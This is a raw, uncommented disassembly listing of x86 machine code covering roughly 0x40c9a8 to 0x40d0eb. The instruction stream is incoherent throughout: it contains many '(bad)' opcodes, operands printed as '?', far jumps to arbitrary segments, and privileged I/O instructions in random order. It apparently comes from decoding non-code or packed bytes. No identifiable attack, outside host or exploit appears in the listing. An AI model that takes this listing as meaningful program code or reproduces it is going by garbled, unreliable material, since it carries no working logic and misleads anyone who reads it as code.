  40c9a8:	ror    BYTE PTR [ecx+edi*8],cl
  40c9ab:	rol    BYTE PTR [edi],1
  40c9ad:	and    ecx,DWORD PTR [edx-0x2fc15265]
  40c9b3:	lods   al,BYTE PTR ds:[esi]
  40c9b4:	sbb    BYTE PTR [ebp*2+0x737012f3],al
  40c9bb:	int    0x68
  40c9bd:	pop    edx
  40c9be:	icebp  
  40c9bf:	xchg   ecx,eax
  40c9c0:	aam    0x5a
  40c9c2:	and    bh,al
  40c9c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9c5:	test   al,0xa7
  40c9c7:	pop    ebp
  40c9c8:	add    eax,0xd92079de
  40c9cd:	in     al,0x7e
  40c9cf:	ja     0x40c994
  40c9d1:	lods   al,BYTE PTR ds:[esi]
  40c9d2:	maskmovq mm6,(bad)
  40c9d3:	div    DWORD PTR [ecx+0x5314a605]
  40c9d9:	pop    eax
  40c9da:	ja     0x40ca3f
  40c9dc:	lock push 0x57
  40c9df:	pusha  
  40c9e0:	mov    ah,0x72
  40c9e2:	sub    ah,BYTE PTR ds:0xabd90339
  40c9e8:	aaa    
  40c9e9:	fsub   st(3),st
  40c9eb:	lea    ecx,[edx-0x662cb831]
  40c9f1:	mov    bh,0x5c
  40c9f3:	hlt    
  40c9f4:	push   ds
  40c9f5:	sub    bl,BYTE PTR [ebx+0x9]
  40c9f8:	push   cs
  40c9f9:	es jle 0x40ca6a
  40c9fc:	loope  0x40ca22
  40c9fe:	dec    esp
  40c9ff:	add    eax,0x1ee3dc06
  40ca04:	loopne 0x40c98b
  40ca06:	shr    ebp,0xf5
  40ca09:	and    al,0xd7
  40ca0b:	inc    eax
  40ca0c:	dec    edi
  40ca0d:	test   eax,0x745f7023
  40ca12:	mov    esp,cs
  40ca14:	dec    ebp
  40ca15:	stc    
  40ca16:	aaa    
  40ca17:	push   esi
  40ca18:	jge    0x40ca78
  40ca1a:	cld    
  40ca1b:	test   al,0x13
  40ca1d:	jno    0x40ca30
  40ca1f:	jne    0x40c9fe
  40ca21:	ins    DWORD PTR es:[edi],dx
  40ca22:	call   0x3fcd:0x78ffaa17
  40ca29:	stc    
  40ca2a:	pushf  
  40ca2b:	sti    
  40ca2c:	imul   esi,ecx,0xfffffff6
  40ca2f:	ret    
  40ca30:	adc    ebx,ebp
  40ca32:	lods   al,BYTE PTR ds:[esi]
  40ca33:	pop    edi
  40ca34:	mov    BYTE PTR [eax+edi*8],al
  40ca37:	in     eax,0x12
  40ca39:	jle    0x40cab8
  40ca3b:	lds    eax,FWORD PTR [eax]
  40ca3d:	pushf  
  40ca3e:	jo     0x40ca79
  40ca40:	mov    al,ds:0x7b07bb00
  40ca45:	cmp    ah,BYTE PTR [edx-0x46]
  40ca48:	xchg   ebp,eax
  40ca49:	sar    DWORD PTR [edx+0x78fff245],cl
  40ca4f:	adc    DWORD PTR [esi],edx
  40ca51:	mov    esp,0x32d20eef
  40ca56:	or     al,0xf5
  40ca58:	push   ecx
  40ca59:	addr16 int 0x46
  40ca5c:	loop   0x40cac2
  40ca5e:	(bad)  
  40ca5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca60:	adc    DWORD PTR [edx-0x50],ebx
  40ca63:	int3   
  40ca64:	adc    esp,DWORD PTR [ebx-0x6e]
  40ca67:	out    dx,al
  40ca68:	jmp    0xee926570
  40ca6d:	retf   
  40ca6e:	call   0x6032:0x526755b9
  40ca75:	aas    
  40ca76:	sub    ecx,DWORD PTR [eax]
  40ca78:	cwde   
  40ca79:	xlat   BYTE PTR ds:[ebx]
  40ca7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca7b:	mov    eax,0x2c7a2496
  40ca80:	fneni(8087 only) 
  40ca82:	mov    edi,0x12c06676
  40ca87:	sbb    eax,0x8dbcb27c
  40ca8c:	and    eax,0x220acaaf
  40ca91:	cwde   
  40ca92:	into   
  40ca93:	arpl   WORD PTR [edi+edx*8],si
  40ca96:	push   ss
  40ca97:	adc    BYTE PTR [edx+0x58],ch
  40ca9a:	xor    BYTE PTR [eax+ecx*2-0x39],ch
  40ca9e:	or     al,0xc6
  40caa0:	xor    DWORD PTR [di+0x58],ebx
  40caa4:	daa    
  40caa5:	mov    al,ds:0xf8623b7b
  40caaa:	adc    DWORD PTR [ebx-0x21e8a532],eax
  40cab0:	repnz out 0xb6,eax
  40cab3:	ins    DWORD PTR es:[edi],dx
  40cab4:	ficomp DWORD PTR [eax]
  40cab6:	xchg   ebp,eax
  40cab7:	mov    al,BYTE PTR [ebp-0x4b]
  40caba:	inc    bl
  40cabc:	out    0xb5,eax
  40cabe:	sub    edi,esi
  40cac0:	cmp    DWORD PTR [eax-0x3c87bf94],0xe85537bf
  40caca:	aaa    
  40cacb:	inc    esi
  40cacc:	dec    eax
  40cacd:	mov    al,ds:0x488e155b
  40cad2:	push   cs
  40cad3:	push   esi
  40cad4:	pop    esi
  40cad5:	in     al,0xd2
  40cad7:	shl    DWORD PTR [esi+0x2d0bbb35],0xb0
  40cade:	into   
  40cadf:	mov    ah,0xe4
  40cae1:	pusha  
  40cae2:	enter  0xbd26,0xb
  40cae6:	add    al,0xa7
  40cae8:	std    
  40cae9:	jae    0x40cae1
  40caeb:	mov    cl,bh
  40caed:	mov    ds:0x7a1beeda,al
  40caf2:	ror    DWORD PTR [edi-0xd],1
  40caf5:	xor    ch,BYTE PTR [eax+0x70ee210b]
  40cafb:	dec    ebp
  40cafc:	cs jge 0x40cb5c
  40caff:	fcmovnu st,st(4)
  40cb01:	loop   0x40cb19
  40cb03:	sbb    DWORD PTR [eax+0x540b74fb],edi
  40cb09:	adc    ebp,ecx
  40cb0b:	inc    eax
  40cb0c:	cli    
  40cb0d:	leave  
  40cb0e:	in     eax,dx
  40cb0f:	push   esi
  40cb10:	(bad)  
  40cb11:	scas   al,BYTE PTR es:[edi]
  40cb12:	push   ds
  40cb13:	pusha  
  40cb14:	sti    
  40cb15:	imul   ecx,edx,0xe50c938a
  40cb1b:	sub    DWORD PTR [edx],ebp
  40cb1d:	dec    edi
  40cb1e:	adc    eax,0x52b3fec1
  40cb23:	pop    ebp
  40cb24:	dec    ebx
  40cb25:	mov    esi,0x1e02ed8c
  40cb2a:	mov    ecx,0x3e274627
  40cb2f:	repnz leave 
  40cb31:	cmp    al,0xba
  40cb33:	out    dx,al
  40cb34:	adc    ah,BYTE PTR [ecx]
  40cb36:	fwait
  40cb37:	aaa    
  40cb38:	pop    ecx
  40cb39:	adc    eax,0x2ac3af56
  40cb3e:	rol    BYTE PTR [ebx+0x7ef9b7e8],cl
  40cb44:	scas   eax,DWORD PTR es:[edi]
  40cb45:	push   ds
  40cb46:	jle    0x40caf4
  40cb48:	or     cl,BYTE PTR [ebp-0x16]
  40cb4b:	or     BYTE PTR [edi+0xe851314],dl
  40cb51:	mov    ch,BYTE PTR [edi-0x6b]
  40cb54:	pop    esi
  40cb55:	in     al,dx
  40cb56:	or     ebx,DWORD PTR [eax]
  40cb58:	js     0x40cb50
  40cb5a:	push   ebp
  40cb5b:	dec    ebx
  40cb5c:	push   eax
  40cb5d:	mov    edi,0xecac70f9
  40cb62:	cmp    al,BYTE PTR [edx]
  40cb64:	jp     0x40cb55
  40cb66:	inc    ebp
  40cb67:	lock pop ecx
  40cb69:	inc    edx
  40cb6a:	push   esp
  40cb6b:	xchg   ebx,eax
  40cb6c:	jnp    0x40cb7e
  40cb6e:	mov    WORD PTR [edi-0xc],ds
  40cb71:	mov    ds:0x5331aa5f,eax
  40cb76:	adc    dh,BYTE PTR [ebp+0x1e5d9d5e]
  40cb7c:	mov    ds:0x1686bfc1,eax
  40cb81:	popf   
  40cb82:	cmc    
  40cb83:	inc    ebp
  40cb84:	adc    ebp,DWORD PTR [eax-0x5318298c]
  40cb8a:	mov    edi,0x6568a4eb
  40cb8f:	cdq    
  40cb90:	xchg   edi,eax
  40cb91:	out    dx,eax
  40cb92:	les    ecx,FWORD PTR [esi-0x63bdda27]
  40cb98:	jmp    0x40cb56
  40cb9a:	pop    ds
  40cb9b:	shl    BYTE PTR [esi+0x68],cl
  40cb9e:	and    esp,DWORD PTR [edx+0x24]
  40cba1:	in     al,dx
  40cba2:	mov    eax,ds:0x2bc541d2
  40cba7:	pop    ecx
  40cba8:	sbb    ch,BYTE PTR [edi]
  40cbaa:	adc    dl,0xa5
  40cbad:	sub    BYTE PTR [eax],dh
  40cbaf:	ins    DWORD PTR es:[edi],dx
  40cbb0:	pop    edx
  40cbb1:	cmp    al,0xe7
  40cbb3:	add    eax,0xa19fbef9
  40cbb8:	es std 
  40cbba:	xchg   edi,eax
  40cbbb:	xchg   ecx,eax
  40cbbc:	mov    dl,0x62
  40cbbe:	or     eax,0x2bbf6527
  40cbc3:	mov    esp,0x40b7bf42
  40cbc8:	shr    DWORD PTR [eax-0x2c],cl
  40cbcb:	push   eax
  40cbcc:	add    dl,BYTE PTR [esi+0x440e4162]
  40cbd2:	fidiv  WORD PTR [esp+edi*4+0x26]
  40cbd6:	xchg   edx,eax
  40cbd7:	xchg   esi,eax
  40cbd8:	(bad)  
  40cbd9:	mov    eax,0x246eb359
  40cbde:	mov    bl,0x17
  40cbe0:	xor    bl,0x93
  40cbe3:	sbb    DWORD PTR [edi+0x3c],ebp
  40cbe6:	sbb    eax,0xa59a9a10
  40cbeb:	shr    BYTE PTR [edi+0x60b318ef],1
  40cbf1:	xchg   ebp,eax
  40cbf2:	mov    ch,0x26
  40cbf4:	test   al,0xd3
  40cbf6:	cmp    BYTE PTR [edx+0x22669382],0x1c
  40cbfd:	scas   al,BYTE PTR es:[edi]
  40cbfe:	out    dx,eax
  40cbff:	xor    ecx,DWORD PTR [eax+edx*8+0x3627e7d2]
  40cc06:	and    bh,bl
  40cc08:	xchg   ebx,eax
  40cc09:	outs   dx,BYTE PTR ds:[esi]
  40cc0a:	adc    al,0xdb
  40cc0c:	jns    0x40cb9d
  40cc0e:	out    0x59,al
  40cc10:	aad    0x87
  40cc12:	pushf  
  40cc13:	arpl   bp,bp
  40cc15:	lods   al,BYTE PTR ds:[esi]
  40cc16:	pop    ebx
  40cc17:	ja     0x40cc0e
  40cc19:	dec    eax
  40cc1a:	jl     0x40cbbc
  40cc1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc1d:	pop    ebx
  40cc1e:	xor    edi,DWORD PTR [bx+di]
  40cc21:	(bad)  
  40cc22:	jmp    0x146de810
  40cc27:	rcl    DWORD PTR [ebp-0x4302aa3a],1
  40cc2d:	mov    ebp,0x972cb68a
  40cc32:	add    DWORD PTR [ecx-0x3ade1972],eax
  40cc38:	ss stos DWORD PTR es:[edi],eax
  40cc3a:	imul   ecx,DWORD PTR [ecx+edx*8+0x78bd155a],0xc9743b41
  40cc45:	push   ecx
  40cc46:	mul    edx
  40cc48:	inc    ebx
  40cc49:	jb     0x40cc74
  40cc4b:	cmp    ebp,DWORD PTR [eax+0x63]
  40cc4e:	add    eax,0x34bf3c6
  40cc53:	(bad)  
  40cc54:	fidiv  DWORD PTR [ebx]
  40cc56:	dec    edx
  40cc57:	sbb    DWORD PTR ds:0x6140adbf,esi
  40cc5d:	jp     0x40cc05
  40cc5f:	aaa    
  40cc60:	stos   DWORD PTR es:[edi],eax
  40cc61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc62:	push   edx
  40cc63:	jmp    0x7c9f:0x54cf9210
  40cc6a:	mov    ecx,0xea63ffbc
  40cc6f:	mov    dl,0x76
  40cc71:	ret    0x9240
  40cc74:	aad    0x49
  40cc76:	clc    
  40cc77:	jle    0x40cc6e
  40cc79:	dec    ebx
  40cc7a:	fistp  QWORD PTR [edi]
  40cc7c:	cmp    DWORD PTR [edx-0x4a],ebp
  40cc7f:	adc    al,0x1f
  40cc81:	mov    ah,0x5
  40cc83:	adc    al,0x75
  40cc85:	cmp    ch,al
  40cc87:	dec    DWORD PTR [ecx]
  40cc89:	rcl    DWORD PTR [edx+0x5d],0x30
  40cc8d:	sahf   
  40cc8e:	or     eax,0x986dad6e
  40cc93:	sub    bl,dl
  40cc95:	fisub  WORD PTR [edi-0x63]
  40cc98:	loope  0x40cc6f
  40cc9a:	push   ecx
  40cc9b:	pop    ecx
  40cc9c:	aaa    
  40cc9d:	iret   
  40cc9e:	xchg   esp,eax
  40cc9f:	mov    DWORD PTR [ebp+0x7e],ebp
  40cca2:	(bad)  
  40cca3:	minps  xmm4,XMMWORD PTR [ecx+0x44]
  40cca7:	shr    BYTE PTR [eax],cl
  40cca9:	xor    al,ch
  40ccab:	mov    esi,DWORD PTR [ebx-0x7]
  40ccae:	(bad)  
  40ccaf:	shl    DWORD PTR [eax+0x3d],cl
  40ccb2:	jns    0x40cc3f
  40ccb4:	inc    edx
  40ccb5:	push   esi
  40ccb6:	jno    0x40cc6d
  40ccb8:	rol    BYTE PTR [ebx+ebx*2-0x17c61659],0xe1
  40ccc0:	push   esp
  40ccc1:	mov    esi,ebx
  40ccc3:	cmp    al,0x1c
  40ccc5:	lahf   
  40ccc6:	xor    al,0xbe
  40ccc8:	mov    dh,0x6a
  40ccca:	ffreep st(0)
  40cccc:	jmp    0x40cd17
  40ccce:	sub    bh,BYTE PTR [esi+0x14]
  40ccd1:	mov    esi,0xf9206e0e
  40ccd6:	lds    esp,FWORD PTR [ebp-0xc4cc8a6]
  40ccdc:	inc    ax
  40ccde:	xchg   ebp,eax
  40ccdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cce0:	jo     0x40cd09
  40cce2:	lods   eax,DWORD PTR ds:[esi]
  40cce3:	adc    dl,BYTE PTR [ecx]
  40cce5:	lock out 0x45,al
  40cce8:	lock pause 
  40cceb:	jne    0x40cd17
  40cced:	outs   dx,DWORD PTR ds:[esi]
  40ccee:	jne    0x40cd6e
  40ccf0:	addr16 std 
  40ccf2:	mov    al,0x9b
  40ccf4:	mov    esp,0x69451388
  40ccf9:	push   ebp
  40ccfa:	mov    esp,ecx
  40ccfc:	xor    eax,0xe54fad79
  40cd01:	sbb    al,0x10
  40cd03:	or     BYTE PTR [ecx],al
  40cd05:	aam    0xd
  40cd07:	rcl    ebx,1
  40cd09:	scas   al,BYTE PTR es:[edi]
  40cd0a:	inc    edx
  40cd0b:	addr16 repz pop ecx
  40cd0e:	fs sub dl,ah
  40cd11:	jmp    0xa132:0x9cc06df0
  40cd18:	add    eax,0xafbc2e50
  40cd1d:	jmp    0x8976:0x9c663b2c
  40cd24:	dec    esi
  40cd25:	aad    0xd4
  40cd27:	xor    BYTE PTR [ebx-0x60],ah
  40cd2a:	ret    
  40cd2b:	mov    dl,0x2f
  40cd2d:	push   ebp
  40cd2e:	and    eax,0xf8b1b2f5
  40cd33:	cmp    ch,BYTE PTR [eax+0x5d]
  40cd36:	(bad)  
  40cd37:	imul   BYTE PTR [ecx+0x7]
  40cd3a:	sti    
  40cd3b:	cmp    bl,dh
  40cd3d:	dec    esp
  40cd3e:	xor    DWORD PTR [eax+0x34f4f652],ebp
  40cd44:	(bad)  
  40cd45:	xor    BYTE PTR [ebx+0x683fd709],al
  40cd4b:	in     eax,0x9
  40cd4d:	mov    ds:0xe9327be5,eax
  40cd52:	call   0x2e70:0x34f645c5
  40cd59:	cli    
  40cd5a:	mov    ds:0xfcb1be54,eax
  40cd5f:	outs   dx,DWORD PTR ds:[esi]
  40cd60:	ds mov dl,cl
  40cd63:	and    BYTE PTR [edx-0x627b141],bl
  40cd69:	cmp    ebp,eax
  40cd6b:	scas   al,BYTE PTR es:[edi]
  40cd6c:	das    
  40cd6d:	pop    edi
  40cd6e:	dec    esp
  40cd6f:	push   cs
  40cd70:	adc    al,0x7a
  40cd72:	cs (bad) 
  40cd74:	xchg   ecx,eax
  40cd75:	imul   edx,esi,0xffffff88
  40cd78:	cld    
  40cd79:	outs   dx,BYTE PTR ds:[esi]
  40cd7a:	fcom   st(7)
  40cd7c:	out    dx,al
  40cd7d:	inc    edi
  40cd7e:	in     al,dx
  40cd7f:	pop    ds
  40cd80:	xchg   esi,eax
  40cd81:	in     eax,dx
  40cd82:	push   ds
  40cd83:	rcl    esp,cl
  40cd85:	outs   dx,BYTE PTR ds:[esi]
  40cd86:	xchg   DWORD PTR [edi+0x45],ecx
  40cd89:	sahf   
  40cd8a:	sbb    ebp,0xffffffcf
  40cd8d:	and    edx,DWORD PTR [ebp-0xe]
  40cd90:	data16 sbb dh,ah
  40cd93:	nop
  40cd94:	fbld   TBYTE PTR [eax-0x48d91cb3]
  40cd9a:	inc    esi
  40cd9b:	(bad)  [ebp-0x37]
  40cd9e:	out    0xa,al
  40cda0:	stos   BYTE PTR es:[edi],al
  40cda1:	popf   
  40cda2:	sub    al,0xe9
  40cda4:	xor    al,0x53
  40cda6:	adc    BYTE PTR [esp+ebx*2-0x6a],dl
  40cdaa:	(bad)  
  40cdab:	out    dx,eax
  40cdac:	loop   0x40cdf5
  40cdae:	jp     0x40cd78
  40cdb0:	test   BYTE PTR [ecx-0x4f],0xb7
  40cdb4:	xchg   ebp,eax
  40cdb5:	fs test eax,0x3a26bd3f
  40cdbb:	sbb    al,BYTE PTR [edx]
  40cdbd:	push   ss
  40cdbe:	adc    eax,0x6a46f7e8
  40cdc3:	add    ecx,DWORD PTR [esp+ebx*1]
  40cdc6:	in     eax,dx
  40cdc7:	jne    0x40cd8e
  40cdc9:	imul   ebx,DWORD PTR [edx],0xfffffff1
  40cdcc:	xor    eax,DWORD PTR ds:0xb4036c16
  40cdd2:	cmp    eax,0x8bd59dc9
  40cdd7:	push   eax
  40cdd8:	popa   
  40cdd9:	xchg   dh,bl
  40cddb:	mov    ds:0x8f20cb3f,al
  40cde0:	inc    edx
  40cde1:	xchg   ecx,eax
  40cde2:	sub    al,0x35
  40cde4:	xor    eax,0x69e9de01
  40cde9:	mov    esp,0xa6b5a1f9
  40cdee:	movnti DWORD PTR [ecx-0x2a],esp
  40cdf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdf3:	add    BYTE PTR [ebx+0x4],al
  40cdf6:	(bad)  
  40cdf7:	pop    ecx
  40cdf8:	jp     0x40cdee
  40cdfa:	jbe    0x40ce48
  40cdfc:	xchg   ecx,eax
  40cdfd:	call   0xfe0f05a0
  40ce02:	retf   
  40ce03:	pop    ss
  40ce04:	cmp    al,0xc5
  40ce06:	clc    
  40ce07:	push   ebp
  40ce08:	(bad)  
  40ce09:	cwde   
  40ce0a:	inc    ecx
  40ce0b:	mov    DWORD PTR [ebp+0x4b9000d9],esi
  40ce11:	adc    al,0xe9
  40ce13:	add    BYTE PTR [ecx-0x3f],bh
  40ce16:	(bad)  
  40ce19:	(bad)  [ebx-0x66b1cfa6]
  40ce1f:	jo     0x40ce57
  40ce21:	fidivr WORD PTR [eax+0x20]
  40ce24:	adc    al,0x3d
  40ce26:	(bad)  
  40ce27:	pushf  
  40ce28:	mov    ch,0xb2
  40ce2a:	jp     0x40ce6d
  40ce2c:	jne    0x40ce99
  40ce2e:	push   cs
  40ce2f:	cmp    ecx,eax
  40ce31:	cmp    esp,ebp
  40ce33:	adc    al,0x29
  40ce35:	repz mov ah,0x2a
  40ce38:	rol    BYTE PTR [eax+0x33],0x52
  40ce3c:	inc    eax
  40ce3d:	loop   0x40cde8
  40ce3f:	xor    al,0x22
  40ce41:	or     edx,edx
  40ce43:	dec    ecx
  40ce44:	les    edx,FWORD PTR [ebx-0x20]
  40ce47:	inc    esi
  40ce48:	mov    eax,ds:0x400237fe
  40ce4d:	push   ds
  40ce4e:	imul   esi,DWORD PTR [eax],0x1b7f8aaf
  40ce54:	enter  0x1bb,0x60
  40ce58:	pop    ebp
  40ce59:	sub    al,BYTE PTR [ebp+0x63]
  40ce5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce5d:	ins    BYTE PTR es:[edi],dx
  40ce5e:	gs inc edx
  40ce60:	stos   BYTE PTR es:[edi],al
  40ce61:	daa    
  40ce62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce63:	cmc    
  40ce64:	pusha  
  40ce65:	mov    bl,0x9f
  40ce67:	add    cl,BYTE PTR [esi]
  40ce69:	loopne 0x40ce78
  40ce6b:	jmp    0x40ce20
  40ce6d:	inc    ebp
  40ce6e:	inc    eax
  40ce6f:	aas    
  40ce70:	shl    ecx,0x30
  40ce73:	(bad)  [ebp+0x28a56e68]
  40ce79:	aam    0x5d
  40ce7b:	adc    edx,DWORD PTR [edx+edi*8-0x42]
  40ce7f:	outs   dx,BYTE PTR ds:[esi]
  40ce80:	mov    eax,ds:0xcb3e90ff
  40ce85:	or     eax,0xee41c7f2
  40ce8a:	sub    eax,0x98a41a8d
  40ce8f:	aam    0xb6
  40ce91:	jne    0x40ce2f
  40ce93:	add    BYTE PTR [edi],bl
  40ce95:	adc    esp,0xc4bd4f98
  40ce9b:	dec    ebp
  40ce9c:	in     al,dx
  40ce9d:	leave  
  40ce9e:	fbstp  TBYTE PTR [ebx-0x344a6bf2]
  40cea4:	cmc    
  40cea5:	push   esp
  40cea6:	ds pop es
  40cea8:	push   edi
  40cea9:	adc    eax,0x9b656f10
  40ceae:	dec    eax
  40ceaf:	sbb    eax,0x4463b8eb
  40ceb4:	ja     0x40ce4b
  40ceb6:	stos   BYTE PTR es:[edi],al
  40ceb7:	aaa    
  40ceb8:	mov    ds:0x2e38aa69,eax
  40cebd:	push   ebp
  40cebe:	gs lock and al,0x17
  40cec2:	shr    ecx,cl
  40cec4:	mov    ds:0x89c13403,eax
  40cec9:	xchg   ecx,eax
  40ceca:	int    0x90
  40cecc:	fldln2 
  40cece:	pop    edx
  40cecf:	daa    
  40ced0:	mov    esi,0xefb7282
  40ced5:	jle    0x40ce91
  40ced7:	adc    BYTE PTR [eax+0x561c87fd],ch
  40cedd:	cmp    ebx,DWORD PTR [edx]
  40cedf:	mov    ds:0x2f84a4e7,eax
  40cee4:	or     BYTE PTR [esi-0x41f76e53],0x3f
  40ceeb:	popa   
  40ceec:	loopne 0x40ceea
  40ceee:	mov    WORD PTR [esi-0x6d],cs
  40cef1:	inc    eax
  40cef2:	int3   
  40cef3:	add    DWORD PTR [ecx+0x4a16501c],0xe1a48924
  40cefd:	or     DWORD PTR [edi+0x44546e0c],ebx
  40cf03:	rcr    edi,1
  40cf05:	pop    eax
  40cf06:	call   0x66b9:0x61b2be
  40cf0d:	mov    DWORD PTR [edx+edx*8],esp
  40cf10:	pop    esp
  40cf11:	test   al,0x88
  40cf13:	sub    DWORD PTR [eax+0x3c245cc0],eax
  40cf19:	add    al,0x7b
  40cf1b:	retf   0xc01d
  40cf1e:	mov    eax,ds:0x6a42d18
  40cf23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf24:	dec    ecx
  40cf25:	aad    0xff
  40cf27:	gs es inc esi
  40cf2a:	std    
  40cf2b:	pop    ss
  40cf2c:	jno    0x40cf2e
  40cf2e:	ins    DWORD PTR es:[edi],dx
  40cf2f:	xlat   BYTE PTR ds:[ebx]
  40cf30:	cli    
  40cf31:	fbld   TBYTE PTR [ebp+0x42]
  40cf34:	aad    0x3c
  40cf36:	cmp    eax,DWORD PTR [ecx+eiz*8-0x135e25ff]
  40cf3d:	addr16 inc edi
  40cf3f:	popa   
  40cf40:	addr16 fwait
  40cf42:	inc    ecx
  40cf43:	dec    esi
  40cf44:	ins    DWORD PTR es:[edi],dx
  40cf45:	sbb    DWORD PTR [ecx+0x6f5a715e],0x77018037
  40cf4f:	mov    cl,0x50
  40cf51:	add    ah,al
  40cf53:	or     BYTE PTR [edx+0x6555bd1f],cl
  40cf59:	push   ecx
  40cf5a:	xchg   BYTE PTR [eiz*4+0x7937ca61],dl
  40cf61:	pop    esp
  40cf62:	pusha  
  40cf63:	push   edx
  40cf64:	xchg   ecx,eax
  40cf65:	sub    ebp,ecx
  40cf67:	shl    BYTE PTR [ebx*1-0x2b97f582],1
  40cf6e:	hlt    
  40cf6f:	and    al,0x30
  40cf71:	retf   0x4321
  40cf74:	mov    DWORD PTR [ecx+0x49],esp
  40cf77:	sub    BYTE PTR [esi-0x4e],bl
  40cf7a:	(bad)  
  40cf7b:	daa    
  40cf7c:	es mov dl,0xbb
  40cf7f:	jecxz  0x40cf16
  40cf81:	xchg   BYTE PTR [ebx],ch
  40cf83:	adc    al,0xc1
  40cf85:	xchg   ebx,eax
  40cf86:	aam    0x69
  40cf88:	jl     0x40cf16
  40cf8a:	in     eax,dx
  40cf8b:	or     DWORD PTR [ebp+0x3622677e],0xffffffb1
  40cf92:	aas    
  40cf93:	push   edx
  40cf94:	fsubr  st,st(0)
  40cf96:	push   ebx
  40cf97:	jecxz  0x40cf9a
  40cf99:	adc    eax,0xc503c255
  40cf9e:	bound  ebx,QWORD PTR [edi-0x41]
  40cfa1:	fidiv  DWORD PTR [ebx]
  40cfa3:	push   ds
  40cfa4:	fsubrp st(3),st
  40cfa6:	jne    0x40cfb6
  40cfa8:	cmp    al,0xde
  40cfaa:	imul   esp,DWORD PTR [edi+0x5b97a89],0x245294e9
  40cfb4:	fistp  DWORD PTR [ebp-0x52]
  40cfb7:	pop    es
  40cfb8:	aas    
  40cfb9:	cmp    BYTE PTR ds:0xff88ba8b,ah
  40cfbf:	mov    cl,0xd5
  40cfc1:	or     esp,ebp
  40cfc3:	cs add bh,BYTE PTR cs:[ebp+esi*4+0x5d]
  40cfc9:	out    0x3b,eax
  40cfcb:	sub    esp,esi
  40cfcd:	in     al,dx
  40cfce:	dec    eax
  40cfcf:	ss mov ebp,0xb2d6a861
  40cfd5:	pop    edi
  40cfd6:	dec    esp
  40cfd7:	and    ch,BYTE PTR [ebp-0x5d]
  40cfda:	mov    ecx,0x894cd5c4
  40cfdf:	data16 mov bh,0x39
  40cfe2:	sub    eax,ecx
  40cfe4:	sub    eax,esp
  40cfe6:	or     cl,BYTE PTR [ebp+0x34b2048]
  40cfec:	stc    
  40cfed:	pop    esp
  40cfee:	in     al,dx
  40cfef:	out    0x2c,eax
  40cff1:	pop    ebp
  40cff2:	out    dx,al
  40cff3:	push   edx
  40cff4:	inc    esi
  40cff5:	cmp    BYTE PTR [esi-0x46],ah
  40cff8:	imul   esp,ebx,0x43
  40cffb:	xor    al,0xe5
  40cffd:	pop    esp
  40cffe:	inc    ebx
  40cfff:	fadd   DWORD PTR [ebp-0x2b3c6ffd]
  40d005:	jae    0x40cfcd
  40d007:	push   eax
  40d008:	jmp    0x50f1:0x28e8529b
  40d00f:	jmp    0xdfc81697
  40d014:	jnp    0x40cfde
  40d016:	jmp    DWORD PTR [ebp+0x5f]
  40d019:	adc    DWORD PTR [ebp-0x7e],ebp
  40d01c:	or     BYTE PTR [ecx-0x57],ah
  40d01f:	mov    ds:0x6d46583f,al
  40d024:	mov    al,ds:0x5b738ab
  40d029:	clc    
  40d02a:	rol    DWORD PTR [edi-0x681697ff],cl
  40d030:	jb     0x40d024
  40d032:	lods   al,BYTE PTR ds:[esi]
  40d033:	jne    0x40d036
  40d035:	or     esp,DWORD PTR [ebp-0x741d7b31]
  40d03b:	jae    0x40d011
  40d03d:	lods   eax,DWORD PTR ds:[esi]
  40d03e:	ja     0x40d092
  40d040:	cmc    
  40d041:	dec    ecx
  40d042:	sbb    al,0xde
  40d044:	mov    ecx,0x1a19d183
  40d049:	xor    ah,BYTE PTR [esi]
  40d04b:	or     BYTE PTR [ebp+0x7f],bl
  40d04e:	adc    DWORD PTR [eax-0x2f],esp
  40d051:	push   ecx
  40d052:	dec    ebp
  40d053:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d054:	fsubr  QWORD PTR [edi-0x62]
  40d057:	add    eax,0x76
  40d05a:	cdq    
  40d05b:	mov    DWORD PTR [esi+edx*8],esi
  40d05e:	mov    bl,0x58
  40d060:	jns    0x40d085
  40d062:	out    dx,al
  40d063:	lahf   
  40d064:	mov    esp,0x800dfe5d
  40d069:	cmp    DWORD PTR [edi+0x35115992],eax
  40d06f:	cmp    bl,BYTE PTR [eax]
  40d071:	test   eax,0x363acb23
  40d076:	adc    ebx,DWORD PTR [eax]
  40d078:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d079:	in     eax,dx
  40d07a:	adc    cl,BYTE PTR [esi+0x3]
  40d07d:	dec    esp
  40d07e:	pop    ebp
  40d07f:	and    bh,BYTE PTR [eax+0x25e16a7a]
  40d085:	aam    0x7d
  40d087:	fidivr WORD PTR [ecx]
  40d089:	dec    ebp
  40d08a:	xchg   edx,eax
  40d08b:	pop    es
  40d08c:	pop    esp
  40d08d:	mov    ebx,0xc5e419fa
  40d092:	int3   
  40d093:	enter  0xfaf8,0xfe
  40d097:	or     DWORD PTR [edi],0x4d993f6e
  40d09d:	mov    esp,eax
  40d09f:	and    DWORD PTR ds:0x9b2272f2,0x9088db3
  40d0a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0aa:	xchg   ebx,eax
  40d0ab:	(bad)  
  40d0ac:	call   0x76f6:0x952bf2ab
  40d0b3:	push   esi
  40d0b4:	mov    edx,0x15725434
  40d0b9:	cld    
  40d0ba:	lock test DWORD PTR [ebx-0x34a2af95],esi
  40d0c1:	arpl   si,ax
  40d0c3:	mov    esi,?
  40d0c5:	pop    eax
  40d0c6:	pushf  
  40d0c7:	cmp    BYTE PTR [eax-0x6f8346b1],al
  40d0cd:	fs jg  0x40d0ae
  40d0d0:	mov    WORD PTR [esi+ebx*4+0x5a4d7e15],?
  40d0d7:	call   0x271b:0x419718ce
  40d0de:	or     DWORD PTR [edi-0x32],esi
  40d0e1:	mov    ds:0x1bb1efd8,eax
  40d0e6:	call   0xda1b2601
  40d0eb:	jbe    0x40d0d6
